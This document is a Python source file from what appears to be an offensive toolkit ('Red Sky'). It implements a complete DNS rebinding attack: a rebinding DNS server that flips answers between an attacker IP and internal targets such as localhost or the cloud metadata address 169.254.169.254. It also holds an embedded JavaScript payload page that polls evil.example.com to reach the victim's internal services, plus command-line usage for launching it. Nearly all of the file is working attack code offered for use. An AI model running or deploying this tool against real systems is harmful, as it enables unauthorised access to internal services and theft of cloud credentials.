# language: Python, file: Program/dns/rebind.py, target: Red Sky dns — DNS rebinding
# DNS rebinding. Classic SSRF-same-origin-bypass technique:
#
#   1. Attacker serves a page from evil.example.com. That page is loaded by
#      the victim's browser under the origin evil.example.com.
#   2. The DNS server for evil.example.com starts with a short TTL (1s).
#      It answers with the attacker's real IP first — the browser fetches
#      the JS payload.
#   3. The page JS starts polling evil.example.com again. The DNS TTL has
#      expired. This time the DNS server answers with a *different* IP —
#      the victim's own localhost (127.0.0.1), the cloud metadata IP
#      (169.254.169.254), or any other internal IP.
#   4. The browser happily connects to that IP under the evil.example.com
#      origin. Same-origin policy is satisfied (the origin is still
#      evil.example.com), but the network destination is now internal.
#
# This file is the DNS server for step 2 and 3. Two modes:
#
#   --victim 127.0.0.1:8080       rebind to a localhost service
#   --victim 169.254.169.254      rebind to cloud metadata (AWS/GCP/Azure)
#
# The attacker's own IP must be supplied via --attacker, that is where the
# payload page is served from.

import json
import socket
import struct
import sys
import threading
import time
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


DNS_DIR = OUTPUT_DIR / "dns"
REBIND_DIR = DNS_DIR / "rebind"


# ── minimal DNS (reuse pattern from tunnel.py) ─────────────────────────────

def _decode_qname(buf: bytes, off: int) -> Tuple[str, int]:
    labels = []
    while True:
        if off >= len(buf):
            raise ValueError("truncated")
        l = buf[off]
        if l == 0:
            off += 1
            break
        if (l & 0xC0) == 0xC0:
            ptr = struct.unpack("!H", buf[off:off+2])[0] & 0x3FFF
            sub, _ = _decode_qname(buf, ptr)
            labels.append(sub)
            off += 2
            break
        off += 1
        labels.append(buf[off:off+l].decode("latin-1", errors="replace"))
        off += l
    return ".".join(labels), off


def _encode_qname(name: str) -> bytes:
    out = bytearray()
    for label in name.rstrip(".").split("."):
        b = label.encode()
        out.append(len(b))
        out += b
    out.append(0)
    return bytes(out)


def _build_a_response(qid: int, qname: str, ip: str, ttl: int) -> bytes:
    hdr = struct.pack("!HHHHHH", qid, 0x8580, 1, 1, 0, 0)
    qsec = _encode_qname(qname) + struct.pack("!HH", 1, 1)
    octets = bytes(int(x) for x in ip.split("."))
    ans = b"\xc0\x0c" + struct.pack("!HHIH", 1, 1, ttl, 4) + octets
    return hdr + qsec + ans


# ── rebind server ──────────────────────────────────────────────────────────

class RebindServer:
    """Alternates the A record between --attacker and --victim on each query.
    Short TTL so the browser re-resolves quickly."""

    def __init__(self, bind: str, domain: str, attacker_ip: str, victim_ip: str,
                 ttl: int = 1, mode: str = "alternate"):
        self.bind = bind
        self.domain = domain.rstrip(".").lower()
        self.attacker = attacker_ip
        self.victim = victim_ip
        self.ttl = ttl
        self.mode = mode
        self.lock = threading.Lock()
        self.state: Dict[str, bool] = {}  # qname → last served victim?
        self.hits: List[Dict] = []

    def _pick(self, qname: str) -> str:
        with self.lock:
            last_victim = self.state.get(qname, False)
            if self.mode == "first_attacker":
                # serve attacker on first query, victim on all subsequent
                next_ip = self.attacker if not last_victim else self.victim
                self.state[qname] = next_ip == self.victim
            else:
                # alternate every query
                next_ip = self.victim if not last_victim else self.attacker
                self.state[qname] = next_ip == self.victim
            return next_ip

    def serve(self):
        host, port_s = self.bind.rsplit(":", 1)
        port = int(port_s)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        print_ok("rebind server listening on " + self.bind)
        print_kv("domain", self.domain)
        print_kv("attacker_ip", self.attacker)
        print_kv("victim_ip", self.victim)
        print_kv("ttl", self.ttl)
        print_kv("mode", self.mode)
        print()
        try:
            while True:
                data, addr = sock.recvfrom(4096)
                if len(data) < 12:
                    continue
                qid, flags, qd, _, _, _ = struct.unpack("!HHHHHH", data[:12])
                if qd < 1:
                    continue
                try:
                    qname, off = _decode_qname(data, 12)
                except Exception:
                    continue
                qname_l = qname.rstrip(".").lower()
                if qname_l.endswith(self.domain):
                    ip = self._pick(qname_l)
                    hit = {"ts": time.time(), "qname": qname_l, "ip": ip, "client": addr[0]}
                    with self.lock:
                        self.hits.append(hit)
                    print("  " + SCARLET + ip + RESET + " " + BONE + qname_l + RESET
                          + " " + ASH + "from " + addr[0] + RESET)
                    resp = _build_a_response(qid, qname, ip, self.ttl)
                    sock.sendto(resp, addr)
                else:
                    # not our domain — refuse
                    resp = struct.pack("!HHHHHH", qid, 0x8183, 0, 0, 0, 0)
                    sock.sendto(resp, addr)
        except KeyboardInterrupt:
            print()
            print_info("stopped")
            REBIND_DIR.mkdir(parents=True, exist_ok=True)
            out = REBIND_DIR / ("hits_" + str(int(time.time())) + ".json")
            out.write_text(json.dumps(self.hits, indent=2))
            print_kv("hits_log", out)


# ── payload page ──────────────────────────────────────────────────────────

PAYLOAD_HTML = """<!doctype html>
<html>
<head><title>Loading...</title></head>
<body>
<p id="status">Loading...</p>
<script>
// This page is served from evil.example.com. It starts polling evil.example.com
// over and over. Once the browser re-resolves and gets the victim IP, the
// fetch below hits the victim's internal service under the same origin.

const status = document.getElementById('status');
let attempt = 0;
let captured = "";

async function poke() {
  attempt++;
  status.textContent = 'Attempt ' + attempt + '...';
  try {
    // Fetch an internal URL via the rebinding domain.
    // Change the path to /latest/meta-data/ for cloud metadata, / for localhost.
    const r = await fetch('http://evil.example.com/INTERNAL_PATH', {
      mode: 'no-cors',
      cache: 'no-store',
    });
    status.textContent = 'OK: ' + r.status;
  } catch (e) {
    status.textContent = 'attempt ' + attempt + ' — ' + e;
  }
}

// Fire often. Browser DNS caching is aggressive — 100ms polling has been
// observed to bypass in under 5 seconds on stock Chrome.
setInterval(poke, 100);

// Also do a burst immediately.
for (let i = 0; i < 20; i++) poke();
</script>
</body>
</html>
"""


def cmd_serve(bind: str, domain: str, attacker_ip: str, victim_ip: str,
              ttl: int, mode: str, payload_out: str) -> int:
    if not domain or not attacker_ip or not victim_ip:
        print_err("--domain, --attacker, --victim required")
        return 1
    REBIND_DIR.mkdir(parents=True, exist_ok=True)
    # drop the payload page to disk regardless
    html_out = Path(payload_out) if payload_out else REBIND_DIR / "payload.html"
    html_out.write_text(PAYLOAD_HTML)
    print_kv("payload_page", html_out)
    print_info("serve the payload page from your attacker host on port 80/443")
    print_info("set your domain's NS record to point at this server's IP")
    print()
    srv = RebindServer(bind, domain, attacker_ip, victim_ip, ttl, mode)
    srv.serve()
    return 0


def run_cli(args):
    import argparse
    sub = args[0] if args else "help"
    rest = args[1:] if args else []

    if sub in ("-h", "--help", "help"):
        print_info("redsky dns rebind <sub-command>")
        print_info("")
        print_info("  serve --bind 0.0.0.0:53 --domain evil.example.com \\")
        print_info("        --attacker 203.0.113.5 --victim 127.0.0.1")
        print_info("      alternate A record between attacker and victim")
        print_info("  payload [--out FILE]")
        print_info("      write the JS payload page")
        print_info("")
        print_info("modes (--mode):")
        print_info("  alternate       alternate attacker/victim every query (default)")
        print_info("  first_attacker  serve attacker first, then victim only")
        return 0

    if sub == "serve":
        p = argparse.ArgumentParser(prog="redsky dns rebind serve", add_help=False)
        p.add_argument("--bind", default="0.0.0.0:53")
        p.add_argument("--domain", default="")
        p.add_argument("--attacker", default="")
        p.add_argument("--victim", default="")
        p.add_argument("--ttl", type=int, default=1)
        p.add_argument("--mode", default="alternate", choices=["alternate", "first_attacker"])
        p.add_argument("--payload-out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky dns rebind serve --domain evil.example.com --attacker IP --victim IP")
            return 2
        return cmd_serve(ns.bind, ns.domain, ns.attacker, ns.victim, ns.ttl, ns.mode, ns.payload_out)

    if sub == "payload":
        p = argparse.ArgumentParser(prog="redsky dns rebind payload", add_help=False)
        p.add_argument("--out", default="")
        try:
            ns = p.parse_args(rest)
        except SystemExit:
            print_err("usage: redsky dns rebind payload [--out FILE]")
            return 2
        REBIND_DIR.mkdir(parents=True, exist_ok=True)
        out = Path(ns.out) if ns.out else REBIND_DIR / "payload.html"
        out.write_text(PAYLOAD_HTML)
        print_ok("payload written: " + str(out))
        return 0

    print_err("unknown rebind sub-command: " + sub)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
